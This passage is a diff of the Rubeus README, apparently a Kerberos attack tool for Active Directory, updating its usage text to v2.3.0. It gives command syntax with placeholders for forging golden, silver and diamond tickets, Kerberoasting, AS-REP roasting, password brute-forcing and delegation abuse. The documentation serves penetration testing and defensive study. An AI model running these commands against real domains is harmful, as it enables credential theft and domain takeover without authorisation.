@@ -39,6 +39,7 @@ Rubeus is licensed under the BSD 3-Clause license.
   - [Ticket Forgery](#ticket-forgery)
     - [golden](#golden)
     - [silver](#silver)
+    - [diamond](#diamond)
   - [Ticket Management](#ticket-management)
     - [ptt](#ptt)
     - [purge](#purge)
@@ -61,6 +62,9 @@ Rubeus is licensed under the BSD 3-Clause license.
     - [hash](#hash)
     - [tgssub](#tgssub)
     - [currentluid](#currentluid)
+    - [logonsession](#logonsession)
+    - [asrep2kirbi](#asrep2kirbi)
+    - [kirbi](#kirbi)
   - [Compile Instructions](#compile-instructions)
     - [Targeting other .NET versions](#targeting-other-net-versions)
     - [Sidenote: Building Rubeus as a Library](#sidenote-building-rubeus-as-a-library)
@@ -79,31 +83,37 @@ Rubeus is licensed under the BSD 3-Clause license.
       | |  \ \| |_| | |_) ) ____| |_| |___ |
       |_|   |_|____/|____/|_____)____/(___/
 
-      v2.0.0
+      v2.3.0
 
 
      Ticket requests and renewals:
 
         Retrieve a TGT based on a user password/hash, optionally saving to a file or applying to the current logon session or a specific LUID:
-            Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/opsec]
+            Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/opsec] [/nopac] [/proxyurl:https://KDC_PROXY/kdcproxy] [/suppenctype:DES|RC4|AES128|AES256]
 
         Retrieve a TGT based on a user password/hash, optionally saving to a file or applying to the current logon session or a specific LUID:
-            Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/opsec]
+            Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/opsec] [/nopac] [/proxyurl:https://KDC_PROXY/kdcproxy] [/suppenctype:DES|RC4|AES128|AES256]
     
         Retrieve a TGT based on a user password/hash, start a /netonly process, and to apply the ticket to the new process/logon session:
-            Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap] [/opsec]
+            Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap] [/opsec] [/nopac] [/proxyurl:https://KDC_PROXY/kdcproxy] [/suppenctype:DES|RC4|AES128|AES256]
 
         Retrieve a TGT using a PCKS12 certificate, start a /netonly process, and to apply the ticket to the new process/logon session:
-            Rubeus.exe asktgt /user:USER /certificate:C:\temp\leaked.pfx </password:STOREPASSWORD> /createnetonly:C:\Windows\System32\cmd.exe [/getcredentials] [/servicekey:KRBTGTKEY] [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap]
+            Rubeus.exe asktgt /user:USER /certificate:C:\temp\leaked.pfx </password:STOREPASSWORD> /createnetonly:C:\Windows\System32\cmd.exe [/getcredentials] [/servicekey:KRBTGTKEY] [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap] [/proxyurl:https://KDC_PROXY/kdcproxy] [/suppenctype:DES|RC4|AES128|AES256]
 
         Retrieve a TGT using a certificate from the users keystore (Smartcard) specifying certificate thumbprint or subject, start a /netonly process, and to apply the ticket to the new process/logon session:
-            Rubeus.exe asktgt /user:USER /certificate:f063e6f4798af085946be6cd9d82ba3999c7ebac /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap]
+            Rubeus.exe asktgt /user:USER /certificate:f063e6f4798af085946be6cd9d82ba3999c7ebac /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/suppenctype:DES|RC4|AES128|AES256] [/nowrap]
 
         Retrieve a TGT suitable for changing an account with an expired password using the changepw command
-            Rubeus.exe asktgt /user:USER </password:PASSWORD /changepw [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/opsec]
+            Rubeus.exe asktgt /user:USER </password:PASSWORD /changepw [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/opsec] [/proxyurl:https://KDC_PROXY/kdcproxy]
+
+        Request a TGT without sending pre-auth data:
+            Rubeus.exe asktgt /user:USER [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/nopac] [/proxyurl:https://KDC_PROXY/kdcproxy] [/suppenctype:DES|RC4|AES128|AES256]
+
+        Request a service ticket using an AS-REQ:
+            Rubeus.exe asktgt /user:USER /service:SPN </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/opsec] [/nopac] [/oldsam] [/proxyurl:https://KDC_PROXY/kdcproxy] [/suppenctype:DES|RC4|AES128|AES256]
 
        Retrieve a service ticket for one or more SPNs, optionally saving or applying the ticket:
-            Rubeus.exe asktgs </ticket:BASE64 | /ticket:FILE.KIRBI> </service:SPN1,SPN2,...> [/enctype:DES|RC4|AES128|AES256] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/enterprise] [/opsec] </tgs:BASE64 | /tgs:FILE.KIRBI> [/targetdomain] [/u2u] [/targetuser] [/servicekey:PASSWORDHASH] [/asrepkey:ASREPKEY]
+            Rubeus.exe asktgs </ticket:BASE64 | /ticket:FILE.KIRBI> </service:SPN1,SPN2,...> [/enctype:DES|RC4|AES128|AES256] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/enterprise] [/opsec] </tgs:BASE64 | /tgs:FILE.KIRBI> [/targetdomain] [/u2u] [/targetuser] [/servicekey:PASSWORDHASH] [/asrepkey:ASREPKEY] [/proxyurl:https://KDC_PROXY/kdcproxy]
 
         Renew a TGT, optionally applying the ticket, saving it, or auto-renewing the ticket up to its renew-till limit:
             Rubeus.exe renew </ticket:BASE64 | /ticket:FILE.KIRBI> [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/autorenew] [/nowrap]
@@ -111,15 +121,18 @@ Rubeus is licensed under the BSD 3-Clause license.
         Perform a Kerberos-based password bruteforcing attack:
             Rubeus.exe brute </password:PASSWORD | /passwords:PASSWORDS_FILE> [/user:USER | /users:USERS_FILE] [/domain:DOMAIN] [/creduser:DOMAIN\\USER & /credpassword:PASSWORD] [/ou:ORGANIZATION_UNIT] [/dc:DOMAIN_CONTROLLER] [/outfile:RESULT_PASSWORD_FILE] [/noticket] [/verbose] [/nowrap]
 
+        Perform a scan for account that do not require pre-authentication:
+            Rubeus.exe preauthscan /users:C:\temp\users.txt [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/proxyurl:https://KDC_PROXY/kdcproxy]
+
 
      Constrained delegation abuse:
 
         Perform S4U constrained delegation abuse:
-            Rubeus.exe s4u </ticket:BASE64 | /ticket:FILE.KIRBI> </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/opsec] [/self]
-            Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/opsec] [/self] [/bronzebit]
+            Rubeus.exe s4u </ticket:BASE64 | /ticket:FILE.KIRBI> </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/opsec] [/self] [/proxyurl:https://KDC_PROXY/kdcproxy] [/createnetonly:C:\Windows\System32\cmd.exe] [/show]
+            Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/opsec] [/self] [/bronzebit] [/nopac] [/proxyurl:https://KDC_PROXY/kdcproxy] [/createnetonly:C:\Windows\System32\cmd.exe] [/show]
 
         Perform S4U constrained delegation abuse across domains:
-            Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER /targetdomain:DOMAIN.LOCAL /targetdc:DC.DOMAIN.LOCAL [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/nowrap] [/self]
+            Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER /targetdomain:DOMAIN.LOCAL /targetdc:DC.DOMAIN.LOCAL [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/nowrap] [/self] [/nopac] [/createnetonly:C:\Windows\System32\cmd.exe] [/show]
 
 
      Ticket Forgery:
@@ -128,19 +141,19 @@ Rubeus is licensed under the BSD 3-Clause license.
             Rubeus.exe golden </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> /ldap [/printcmd] [outfile:FILENAME] [/ptt]
 
         Forge a golden ticket using LDAP to gather the relevent information but explicitly overriding some values:
-            Rubeus.exe golden </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> /ldap [/dc:DOMAIN_CONTROLLER] [/domain:DOMAIN] [/netbios:NETBIOS_DOMAIN] [/sid:DOMAIN_SID] [/dispalyname:PAC_FULL_NAME] [/badpwdcount:INTEGER] [/flags:TICKET_FLAGS] [/uac:UAC_FLAGS] [/groups:GROUP_IDS] [/pgid:PRIMARY_GID] [/homedir:HOMEDIR] [/homedrive:HOMEDRIVE] [/id:USER_ID] [/logofftime:LOGOFF_TIMESTAMP] [/lastlogon:LOGON_TIMESTAMP] [/logoncount:INTEGER] [/passlastset:PASSWORD_CHANGE_TIMESTAMP] [/maxpassage:RELATIVE_TO_PASSLASTSET] [/minpassage:RELATIVE_TO_PASSLASTSET] [/profilepath:PROFILE_PATH] [/scriptpath:LOGON_SCRIPT_PATH] [/sids:EXTRA_SIDS] [[/resourcegroupsid:RESOURCEGROUPS_SID] [/resourcegroups:GROUP_IDS]] [/authtime:AUTH_TIMESTAMP] [/starttime:Start_TIMESTAMP] [/endtime:RELATIVE_TO_STARTTIME] [/renewtill:RELATIVE_TO_STARTTIME] [/rangeend:RELATIVE_TO_STARTTIME] [/rangeinterval:RELATIVE_INTERVAL] [/printcmd] [outfile:FILENAME] [/ptt]
+            Rubeus.exe golden </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> /ldap [/dc:DOMAIN_CONTROLLER] [/domain:DOMAIN] [/netbios:NETBIOS_DOMAIN] [/sid:DOMAIN_SID] [/dispalyname:PAC_FULL_NAME] [/badpwdcount:INTEGER] [/flags:TICKET_FLAGS] [/uac:UAC_FLAGS] [/groups:GROUP_IDS] [/pgid:PRIMARY_GID] [/homedir:HOMEDIR] [/homedrive:HOMEDRIVE] [/id:USER_ID] [/logofftime:LOGOFF_TIMESTAMP] [/lastlogon:LOGON_TIMESTAMP] [/logoncount:INTEGER] [/passlastset:PASSWORD_CHANGE_TIMESTAMP] [/maxpassage:RELATIVE_TO_PASSLASTSET] [/minpassage:RELATIVE_TO_PASSLASTSET] [/profilepath:PROFILE_PATH] [/scriptpath:LOGON_SCRIPT_PATH] [/sids:EXTRA_SIDS] [[/resourcegroupsid:RESOURCEGROUPS_SID] [/resourcegroups:GROUP_IDS]] [/authtime:AUTH_TIMESTAMP] [/starttime:Start_TIMESTAMP] [/endtime:RELATIVE_TO_STARTTIME] [/renewtill:RELATIVE_TO_STARTTIME] [/rangeend:RELATIVE_TO_STARTTIME] [/rangeinterval:RELATIVE_INTERVAL] [/oldpac] [/extendedupndns] [/printcmd] [outfile:FILENAME] [/ptt]
 
         Forge a golden ticket, setting values explicitly:
-            Rubeus.exe golden </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </domain:DOMAIN> </sid:DOMAIN_SID> [/dc:DOMAIN_CONTROLLER] [/netbios:NETBIOS_DOMAIN] [/dispalyname:PAC_FULL_NAME] [/badpwdcount:INTEGER] [/flags:TICKET_FLAGS] [/uac:UAC_FLAGS] [/groups:GROUP_IDS] [/pgid:PRIMARY_GID] [/homedir:HOMEDIR] [/homedrive:HOMEDRIVE] [/id:USER_ID] [/logofftime:LOGOFF_TIMESTAMP] [/lastlogon:LOGON_TIMESTAMP] [/logoncount:INTEGER] [/passlastset:PASSWORD_CHANGE_TIMESTAMP] [/maxpassage:RELATIVE_TO_PASSLASTSET] [/minpassage:RELATIVE_TO_PASSLASTSET] [/profilepath:PROFILE_PATH] [/scriptpath:LOGON_SCRIPT_PATH] [/sids:EXTRA_SIDS] [[/resourcegroupsid:RESOURCEGROUPS_SID] [/resourcegroups:GROUP_IDS]] [/authtime:AUTH_TIMESTAMP] [/starttime:Start_TIMESTAMP] [/endtime:RELATIVE_TO_STARTTIME] [/renewtill:RELATIVE_TO_STARTTIME] [/rangeend:RELATIVE_TO_STARTTIME] [/rangeinterval:RELATIVE_INTERVAL] [/printcmd] [outfile:FILENAME] [/ptt]
+            Rubeus.exe golden </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </domain:DOMAIN> </sid:DOMAIN_SID> [/dc:DOMAIN_CONTROLLER] [/netbios:NETBIOS_DOMAIN] [/dispalyname:PAC_FULL_NAME] [/badpwdcount:INTEGER] [/flags:TICKET_FLAGS] [/uac:UAC_FLAGS] [/groups:GROUP_IDS] [/pgid:PRIMARY_GID] [/homedir:HOMEDIR] [/homedrive:HOMEDRIVE] [/id:USER_ID] [/logofftime:LOGOFF_TIMESTAMP] [/lastlogon:LOGON_TIMESTAMP] [/logoncount:INTEGER] [/passlastset:PASSWORD_CHANGE_TIMESTAMP] [/maxpassage:RELATIVE_TO_PASSLASTSET] [/minpassage:RELATIVE_TO_PASSLASTSET] [/profilepath:PROFILE_PATH] [/scriptpath:LOGON_SCRIPT_PATH] [/sids:EXTRA_SIDS] [[/resourcegroupsid:RESOURCEGROUPS_SID] [/resourcegroups:GROUP_IDS]] [/authtime:AUTH_TIMESTAMP] [/starttime:Start_TIMESTAMP] [/endtime:RELATIVE_TO_STARTTIME] [/renewtill:RELATIVE_TO_STARTTIME] [/rangeend:RELATIVE_TO_STARTTIME] [/rangeinterval:RELATIVE_INTERVAL] [/oldpac] [/extendedupndns] [/printcmd] [outfile:FILENAME] [/ptt]
 
         Forge a silver ticket using LDAP to gather the relevent information:
-            Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> /ldap [/printcmd] [outfile:FILENAME] [/ptt]
+            Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> /ldap [/extendedupndns] [/nofullpacsig] [/printcmd] [outfile:FILENAME] [/ptt]
 
         Forge a silver ticket using LDAP to gather the relevent information, using the KRBTGT key to calculate the KDCChecksum and TicketChecksum:
-            Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> /ldap </krbkey:HASH> [/krbenctype:DES|RC4|AES128|AES256] [/printcmd] [outfile:FILENAME] [/ptt]
+            Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> /ldap </krbkey:HASH> [/krbenctype:DES|RC4|AES128|AES256] [/extendedupndns] [/nofullpacsig] [/printcmd] [outfile:FILENAME] [/ptt]
 
         Forge a silver ticket using LDAP to gather the relevent information but explicitly overriding some values:
-            Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> /ldap [/dc:DOMAIN_CONTROLLER] [/domain:DOMAIN] [/netbios:NETBIOS_DOMAIN] [/sid:DOMAIN_SID] [/dispalyname:PAC_FULL_NAME] [/badpwdcount:INTEGER] [/flags:TICKET_FLAGS] [/uac:UAC_FLAGS] [/groups:GROUP_IDS] [/pgid:PRIMARY_GID] [/homedir:HOMEDIR] [/homedrive:HOMEDRIVE] [/id:USER_ID] [/logofftime:LOGOFF_TIMESTAMP] [/lastlogon:LOGON_TIMESTAMP] [/logoncount:INTEGER] [/passlastset:PASSWORD_CHANGE_TIMESTAMP] [/maxpassage:RELATIVE_TO_PASSLASTSET] [/minpassage:RELATIVE_TO_PASSLASTSET] [/profilepath:PROFILE_PATH] [/scriptpath:LOGON_SCRIPT_PATH] [/sids:EXTRA_SIDS] [[/resourcegroupsid:RESOURCEGROUPS_SID] [/resourcegroups:GROUP_IDS]] [/authtime:AUTH_TIMESTAMP] [/starttime:Start_TIMESTAMP] [/endtime:RELATIVE_TO_STARTTIME] [/renewtill:RELATIVE_TO_STARTTIME] [/rangeend:RELATIVE_TO_STARTTIME] [/rangeinterval:RELATIVE_INTERVAL] [/authdata] [/printcmd] [outfile:FILENAME] [/ptt]
+            Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> /ldap [/dc:DOMAIN_CONTROLLER] [/domain:DOMAIN] [/netbios:NETBIOS_DOMAIN] [/sid:DOMAIN_SID] [/dispalyname:PAC_FULL_NAME] [/badpwdcount:INTEGER] [/flags:TICKET_FLAGS] [/uac:UAC_FLAGS] [/groups:GROUP_IDS] [/pgid:PRIMARY_GID] [/homedir:HOMEDIR] [/homedrive:HOMEDRIVE] [/id:USER_ID] [/logofftime:LOGOFF_TIMESTAMP] [/lastlogon:LOGON_TIMESTAMP] [/logoncount:INTEGER] [/passlastset:PASSWORD_CHANGE_TIMESTAMP] [/maxpassage:RELATIVE_TO_PASSLASTSET] [/minpassage:RELATIVE_TO_PASSLASTSET] [/profilepath:PROFILE_PATH] [/scriptpath:LOGON_SCRIPT_PATH] [/sids:EXTRA_SIDS] [[/resourcegroupsid:RESOURCEGROUPS_SID] [/resourcegroups:GROUP_IDS]] [/authtime:AUTH_TIMESTAMP] [/starttime:Start_TIMESTAMP] [/endtime:RELATIVE_TO_STARTTIME] [/renewtill:RELATIVE_TO_STARTTIME] [/rangeend:RELATIVE_TO_STARTTIME] [/rangeinterval:RELATIVE_INTERVAL] [/authdata] [/extendedupndns] [/nofullpacsig] [/printcmd] [outfile:FILENAME] [/ptt]
 
         Forge a silver ticket using LDAP to gather the relevent information and including an S4U Delegation Info PAC section:
             Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> /ldap [/s4uproxytarget:TARGETSPN] [/s4utransitedservices:SPN1,SPN2,...] [/printcmd] [outfile:FILENAME] [/ptt]
@@ -149,7 +162,16 @@ Rubeus is licensed under the BSD 3-Clause license.
             Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> /ldap [/cname:CLIENTNAME] [/crealm:CLIENTDOMAIN] [/printcmd] [outfile:FILENAME] [/ptt]
 
         Forge a silver ticket, setting values explicitly:
-            Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> </domain:DOMAIN> </sid:DOMAIN_SID> [/dc:DOMAIN_CONTROLLER] [/netbios:NETBIOS_DOMAIN] [/dispalyname:PAC_FULL_NAME] [/badpwdcount:INTEGER] [/flags:TICKET_FLAGS] [/uac:UAC_FLAGS] [/groups:GROUP_IDS] [/pgid:PRIMARY_GID] [/homedir:HOMEDIR] [/homedrive:HOMEDRIVE] [/id:USER_ID] [/logofftime:LOGOFF_TIMESTAMP] [/lastlogon:LOGON_TIMESTAMP] [/logoncount:INTEGER] [/passlastset:PASSWORD_CHANGE_TIMESTAMP] [/maxpassage:RELATIVE_TO_PASSLASTSET] [/minpassage:RELATIVE_TO_PASSLASTSET] [/profilepath:PROFILE_PATH] [/scriptpath:LOGON_SCRIPT_PATH] [/sids:EXTRA_SIDS] [[/resourcegroupsid:RESOURCEGROUPS_SID] [/resourcegroups:GROUP_IDS]] [/authtime:AUTH_TIMESTAMP] [/starttime:Start_TIMESTAMP] [/endtime:RELATIVE_TO_STARTTIME] [/renewtill:RELATIVE_TO_STARTTIME] [/rangeend:RELATIVE_TO_STARTTIME] [/rangeinterval:RELATIVE_INTERVAL] [/authdata] [/cname:CLIENTNAME] [/crealm:CLIENTDOMAIN] [/s4uproxytarget:TARGETSPN] [/s4utransitedservices:SPN1,SPN2,...] [/printcmd] [outfile:FILENAME] [/ptt]
+            Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> </domain:DOMAIN> </sid:DOMAIN_SID> [/dc:DOMAIN_CONTROLLER] [/netbios:NETBIOS_DOMAIN] [/dispalyname:PAC_FULL_NAME] [/badpwdcount:INTEGER] [/flags:TICKET_FLAGS] [/uac:UAC_FLAGS] [/groups:GROUP_IDS] [/pgid:PRIMARY_GID] [/homedir:HOMEDIR] [/homedrive:HOMEDRIVE] [/id:USER_ID] [/logofftime:LOGOFF_TIMESTAMP] [/lastlogon:LOGON_TIMESTAMP] [/logoncount:INTEGER] [/passlastset:PASSWORD_CHANGE_TIMESTAMP] [/maxpassage:RELATIVE_TO_PASSLASTSET] [/minpassage:RELATIVE_TO_PASSLASTSET] [/profilepath:PROFILE_PATH] [/scriptpath:LOGON_SCRIPT_PATH] [/sids:EXTRA_SIDS] [[/resourcegroupsid:RESOURCEGROUPS_SID] [/resourcegroups:GROUP_IDS]] [/authtime:AUTH_TIMESTAMP] [/starttime:Start_TIMESTAMP] [/endtime:RELATIVE_TO_STARTTIME] [/renewtill:RELATIVE_TO_STARTTIME] [/rangeend:RELATIVE_TO_STARTTIME] [/rangeinterval:RELATIVE_INTERVAL] [/authdata] [/cname:CLIENTNAME] [/crealm:CLIENTDOMAIN] [/s4uproxytarget:TARGETSPN] [/s4utransitedservices:SPN1,SPN2,...] [/extendedupndns] [/nofullpacsig] [/printcmd] [outfile:FILENAME] [/ptt]
+
+		Forge a diamond TGT by requesting a TGT based on a user password/hash:
+			Rubeus.exe diamond /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/createnetonly:C:\Windows\System32\cmd.exe] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/krbkey:HASH] [/ticketuser:USERNAME] [/ticketuserid:USER_ID] [/groups:GROUP_IDS] [/sids:EXTRA_SIDS]
+    
+		Forge a diamond TGT by requesting a TGT using a PCKS12 certificate:
+			Rubeus.exe diamond /user:USER /certificate:C:\temp\leaked.pfx </password:STOREPASSWORD> [/createnetonly:C:\Windows\System32\cmd.exe] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/krbkey:HASH] [/ticketuser:USERNAME] [/ticketuserid:USER_ID] [/groups:GROUP_IDS] [/sids:EXTRA_SIDS]
+    
+		Forge a diamond TGT by requesting a TGT using tgtdeleg:
+			Rubeus.exe diamond /tgtdeleg [/createnetonly:C:\Windows\System32\cmd.exe] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/krbkey:HASH] [/ticketuser:USERNAME] [/ticketuserid:USER_ID] [/groups:GROUP_IDS] [/sids:EXTRA_SIDS]
 
 
      Ticket management:
@@ -161,7 +183,7 @@ Rubeus is licensed under the BSD 3-Clause license.
             Rubeus.exe purge [/luid:LOGINID]
 
         Parse and describe a ticket (service ticket or TGT):
-            Rubeus.exe describe </ticket:BASE64 | /ticket:FILE.KIRBI> [/servicekey:HASH] [/krbkey:HASH] [/asrepkey:HASH] [/serviceuser:USERNAME] [/servicedomain:DOMAIN]
+            Rubeus.exe describe </ticket:BASE64 | /ticket:FILE.KIRBI> [/servicekey:HASH] [/krbkey:HASH] [/asrepkey:HASH] [/serviceuser:USERNAME] [/servicedomain:DOMAIN] [/desplaintext:FIRSTBLOCKTEXT]
 
 
      Ticket extraction and harvesting:
@@ -229,20 +251,23 @@ Rubeus is licensed under the BSD 3-Clause license.
         Perform AES Kerberoasting:
             Rubeus.exe kerberoast /aes [/ldaps] [/nowrap]
 
+        Perform Kerberoasting using an account without pre-auth by sending AS-REQ's:
+            Rubeus.exe kerberoast </spn:""blah/blah"" | /spns:C:\temp\spns.txt> /nopreauth:USER /domain:DOMAIN [/dc:DOMAIN_CONTROLLER] [/nowrap]
+
         Perform AS-REP "roasting" for any users without preauth:
-            Rubeus.exe asreproast [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]
+            Rubeus.exe asreproast [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/des] [/nowrap]
 
         Perform AS-REP "roasting" for any users without preauth, outputting Hashcat format to a file:
-            Rubeus.exe asreproast /outfile:hashes.txt /format:hashcat [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps]
+            Rubeus.exe asreproast /outfile:hashes.txt /format:hashcat [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/des]
 
         Perform AS-REP "roasting" for any users without preauth using alternate credentials:
-            Rubeus.exe asreproast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU,..."] [/ldaps] [/nowrap]
+            Rubeus.exe asreproast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU,..."] [/ldaps] [/des] [/nowrap]
 
 
      Miscellaneous:
 
         Create a hidden program (unless /show is passed) with random /netonly credentials, displaying the PID and LUID:
-            Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" [/show]
+            Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" [/show] [/ticket:BASE64 | /ticket:FILE.KIRBI]
 
         Reset a user's password from a supplied TGT (AoratoPw):
             Rubeus.exe changepw </ticket:BASE64 | /ticket:FILE.KIRBI> /new:PASSWORD [/dc:DOMAIN_CONTROLLER] [/targetuser:DOMAIN\USERNAME]
@@ -251,15 +276,26 @@ Rubeus is licensed under the BSD 3-Clause license.
             Rubeus.exe hash /password:X [/user:USER] [/domain:DOMAIN]
 
         Substitute an sname or SPN into an existing service ticket:
-            Rubeus.exe tgssub </ticket:BASE64 | /ticket:FILE.KIRBI> /altservice:ldap [/ptt] [/luid] [/nowrap]
-            Rubeus.exe tgssub </ticket:BASE64 | /ticket:FILE.KIRBI> /altservice:cifs/computer.domain.com [/ptt] [/luid] [/nowrap]
+            Rubeus.exe tgssub </ticket:BASE64 | /ticket:FILE.KIRBI> /altservice:ldap [/srealm:DOMAIN] [/ptt] [/luid] [/nowrap]
+            Rubeus.exe tgssub </ticket:BASE64 | /ticket:FILE.KIRBI> /altservice:cifs/computer.domain.com [/srealm:DOMAIN] [/ptt] [/luid] [/nowrap]
 
         Display the current user's LUID:
             Rubeus.exe currentluid
 
+        Display information about the (current) or (target) logon session, default all readable:
+            Rubeus.exe logonsession [/current] [/luid:X]
+
         The "/consoleoutfile:C:\FILE.txt" argument redirects all console output to the file specified.
 
         The "/nowrap" flag prevents any base64 ticket blobs from being column wrapped for any function.
+
+        The "/debug" flag outputs ASN.1 debugging information.
+		
+        Convert an AS-REP and a key to a Kirbi:
